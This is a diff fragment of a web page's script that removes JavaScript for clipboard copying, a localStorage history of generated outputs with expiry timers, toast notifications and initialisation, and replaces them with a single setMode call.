-  flashBtn('copyBtnB');
-}
-
-// ─── Clipboard ───────────────────────────────────────────────────
-async function copyToClipboard(text) {
-  try {
-    if (navigator.clipboard?.writeText) {
-      await navigator.clipboard.writeText(text);
-    } else { fallbackCopy(text); }
-    toast('Copied ✓');
-  } catch { fallbackCopy(text); toast('Copied (fallback)'); }
-}
-function fallbackCopy(text) {
-  const t = document.createElement('textarea');
-  t.value = text; t.style.cssText = 'position:fixed;top:-9999px;left:-9999px';
-  document.body.appendChild(t); t.focus(); t.select();
-  try { document.execCommand('copy'); } catch(e){}
-  document.body.removeChild(t);
-}
-function flashBtn(id) {
-  const btn = document.getElementById(id);
-  btn.textContent = 'Copied!'; btn.classList.add('ok');
-  setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('ok'); }, 2000);
-}
-
-// ─── History ─────────────────────────────────────────────────────
-function loadHistory() {
-  try {
-    const arr = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
-    const now = Date.now();
-    return arr.filter(e => (now - e.ts) < TTL_MS);
-  } catch { return []; }
-}
-function saveHistory(entries) {
-  localStorage.setItem(STORAGE_KEY, JSON.stringify(entries.slice(0, 50)));
-}
-function addToHistory(method, label, output) {
-  const h = loadHistory();
-  h.unshift({ method, label, output, ts: Date.now() });
-  saveHistory(h);
-  renderHistory();
-}
-function deleteHistoryEntry(i) {
-  const h = loadHistory();
-  h.splice(i, 1);
-  saveHistory(h);
-  renderHistory();
-  toast('Removed');
-}
-function clearAll() { saveHistory([]); renderHistory(); toast('Cleared'); }
-
-function renderHistory() {
-  const h = loadHistory();
-  const wrap = document.getElementById('hist');
-  const list = document.getElementById('hList');
-  if (!h.length) { wrap.style.display = 'none'; return; }
-  wrap.style.display = 'block';
-  const now = Date.now();
-  list.innerHTML = h.map((e, i) => {
-    const tl = TTL_MS - (now - e.ts);
-    const hr = Math.max(0, Math.floor(tl / 3600000));
-    const mn = Math.max(0, Math.floor((tl % 3600000) / 60000));
-    const safeLabel = e.label.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-    const safeOut = e.output.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-    return `<div class="h-row">
-      <div class="h-info">
-        <div class="h-fake">[${e.method}] ${safeLabel}</div>
-        <div class="h-real">→ ${safeOut}</div>
-      </div>
-      <div class="h-ttl">${hr}h ${mn}m</div>
-      <div class="h-btns">
-        <button class="hbtn" onclick="copyHistEntry(${i})">Copy</button>
-        <button class="hbtn d" onclick="deleteHistoryEntry(${i})">Del</button>
-      </div>
-    </div>`;
-  }).join('');
-}
-
-window.copyHistEntry = function(i) {
-  const h = loadHistory();
-  if (!h[i]) return;
-  copyToClipboard(h[i].output);
-};
-
-// ─── Toast ───────────────────────────────────────────────────────
-function toast(msg) {
-  const el = document.getElementById('toast');
-  el.textContent = msg; el.classList.add('show');
-  clearTimeout(window._tt);
-  window._tt = setTimeout(() => el.classList.remove('show'), 2200);
-}
-
-// ─── Init ────────────────────────────────────────────────────────
-(function() {
-  document.getElementById('liveSlug').textContent = randomSlug(8);
-  updatePreviewA();
-  updatePreviewB();
-  renderHistory();
-})();
-</script>
+    // Init
+    setMode('a');
+  </script>
 </body>
 </html>
